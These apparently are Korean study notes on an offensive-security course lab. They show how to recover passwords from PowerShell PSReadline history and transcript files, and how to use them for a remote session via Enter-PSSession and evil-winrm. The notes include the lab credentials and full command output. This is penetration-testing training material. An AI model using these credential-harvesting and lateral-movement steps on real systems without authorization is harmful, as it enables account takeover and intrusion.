# 17.1.4 정보의 보고 PowerShell

> **Information Goldmine PowerShell** · PEN-200 §17.1.4

사용자 보안 인식이 올라가 메모·텍스트 파일에 비밀번호를 적어두는 관행은 줄었음. 대신 방어 측이 시스템에서 실행된 명령을 **수집·기록**하기 시작했고, 그 기록이 공격자에게는 새로운 정보원이 됨. PowerShell 은 공격자가 반드시 거치는 도구라 로깅의 1순위 대상임 — 기본 설정의 로깅은 빈약해서 기업 환경에서는 별도 로깅을 켜두는 것이 보통임.

주요 로깅 두 가지:

- **PowerShell Transcription** — "어깨너머 기록(over-the-shoulder)". 사용자가 PowerShell 에 친 것을 옆에서 들여다본 것과 같은 내용이 transcript 파일로 남음. 저장 위치는 사용자 홈 디렉터리, 머신 공용 디렉터리, 또는 여러 머신의 파일을 모으는 네트워크 공유
- **Script Block Logging** — 실행되는 명령·스크립트 블록을 이벤트로 기록. 코드 전문이 실행 시점에 남으므로 **인코딩된 코드도 디코딩된 원형으로** 남는다는 점이 특히 유용함

로깅 활성화 여부를 따지기 전에 사용자의 PowerShell 히스토리를 먼저 확인함. `Get-History` 로 과거 명령 목록을 뽑음.

```
PS C:\Users\dave> Get-History
Get-History
```

비어 있음. 그러나 이것으로 끝내면 안 되는 이유가 있음 — **`Clear-History` 는 PowerShell 자체 히스토리만 지움.** PowerShell v5·v5.1·v7 에는 줄 편집과 명령 히스토리를 담당하는 `PSReadline` 모듈이 포함돼 있는데, `Clear-History` 는 PSReadline 이 파일로 남긴 히스토리를 **건드리지 않음**. 관리자 대부분이 `Clear-History` 한 번으로 흔적이 다 지워졌다고 오해하므로, 그 파일이 그대로 남아 있을 확률이 높음.

경로는 `Get-PSReadlineOption` 의 옵션 중 하나를 꺼내 확인함. 전체를 괄호로 감싸고 점을 붙여 옵션 하나만 뽑는 문법임.

```
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
(Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hist
ory.txt
```

⚠️ 위 경로가 두 줄로 접힌 것은 교재 PDF 자체의 조판임 — 실제 파일명은 `ConsoleHost_history.txt` 한 덩어리이고, 아래 블록들에서 접힌 줄도 마찬가지로 그대로 복사해 쓰면 실패함.

```
PS C:\Users\dave> type
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hist
ory.txt
...
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -
VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```

여기서 걷을 것:

- `Register-SecretVault` + `SecretManagement.keepass` → 사용자가 KeePass 기반 비밀번호 관리자 저장소를 만들었음
- `Set-Secret` 로 `Server02 Admin PW` = `paperEarMonitor33@` 저장. 이름상 **다른 시스템**의 자격 증명이나, 재사용을 노려 현재 대상의 사용자·서비스·로그인에도 전부 시도해볼 것
- `Start-Transcript` 가 transcript 저장 경로를 그대로 노출함
- `Enter-PSSession ... -Credential $cred` — 그런데 **`$cred` 를 만드는 명령이 히스토리에 없음.** 어느 계정·비밀번호였는지 여기서는 알 수 없음

PowerShell Remoting 은 `Enter-PSSession` 같은 Cmdlet 에서 기본적으로 WinRM 을 씀. 따라서 대상 사용자가 원격 관리용 로컬 그룹 `Remote Management Users` 에 속해 있어야 함. WinRM 대신 SSH 를 쓰는 구성도 가능함.

> ⚠️ **교재 오류** — 교재는 이 그룹명을 `Windows Management Users` 로 적으나 실제 그룹명은 `Remote Management Users` 임. 같은 교재의 §17.1.2(「Remote Management Users 구성원은 WinRM 으로 접근」)와 §17.1.5 winPEAS 출력(`|->Groups: ...,Remote Management Users,Users`)이 모두 후자를 씀.

핵심 인과 — **`Start-Transcript` 가 `Enter-PSSession` 보다 «먼저» 실행됐으므로**, 히스토리에서 빠진 `$cred` 생성 과정이 transcript 안에는 평문으로 남아 있을 것.

```
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143

RunAs User: CLIENTWK220\dave
Configuration Name:

PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -
AsPlainText -Force
PS C:\Users\dave> $cred = New-Object
System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript

```

`daveadmin` / `qwertqwertqwert123!!` 확보. PSCredential 을 만드는 순서는 두 단계 — 비밀번호를 `ConvertTo-SecureString` 으로 SecureString 화한 뒤, 사용자명과 그 SecureString 으로 `PSCredential` 객체를 생성. 그 변수를 `-Credential` 인자로 넘김.

세 명령을 바인드 셸에 그대로 붙여넣으면 `Enter-PSSession` 이 붙고 `whoami` 는 `clientwk220\daveadmin` 을 돌려줌.

```
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -
AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object
System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```
*SecureString 생성 → PSCredential 조립 → `Enter-PSSession` 접속까지. 마지막 `whoami` 가 `clientwk220\daveadmin` 을 반환함*

⚠️ 첫 줄 끝의 `-` 와 `New-Object` 뒤의 줄바꿈은 교재 PDF 자체의 조판으로 줄이 접힌 것임 — `... -AsPlainText -Force` 까지, `New-Object System.Management.Automation.PSCredential(...)` 까지가 각각 한 줄임. 그대로 복사해 쓰면 실패함.

그런데 이어지는 `cd`·`pwd`·`dir` 은 **출력이 전혀 오지 않음**.

```
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
cd C:\
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
pwd
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
dir
```
*원격 세션에서 친 `cd`·`pwd`·`dir` — 명령만 반향되고 결과가 돌아오지 않음*

바인드 셸 안에서 PowerShell 원격 세션을 만들면 이런 예측 못 할 동작이 나옴. 대신 Kali 에서 `evil-winrm` 으로 직접 붙을 것.


*evil-winrm 접속 후 `whoami`·`cd`·`dir` 이 전부 정상 응답함 — 바인드 셸 안의 `Enter-PSSession` 과 대비되는 지점임*

비밀번호의 `!` 두 개를 셸에서 이스케이프해야 하는 점이 함정임. `evil-winrm` 은 pass-the-hash·메모리 내 로딩·파일 업로드/다운로드도 제공하지만 여기서는 WinRM 접속만 씀. 붙은 뒤에는 `cd`·`dir` 이 정상 동작함.

PSReadline 히스토리 파일과 transcript 파일은 **건너뛰지 말아야 할 1순위 항목**임. 방어 측이 이를 막으려면 `Set-PSReadlineOption` 의 `-HistorySaveStyle` 을 `SaveNothing` 으로 두거나 히스토리 파일을 수동으로 지워야 함 — 둘 중 하나면 충분하지만, 관리자 대부분은 `Clear-History` 로 끝났다고 여겨 어느 쪽도 하지 않으므로 PSReadline 히스토리는 그대로 남아 있음.
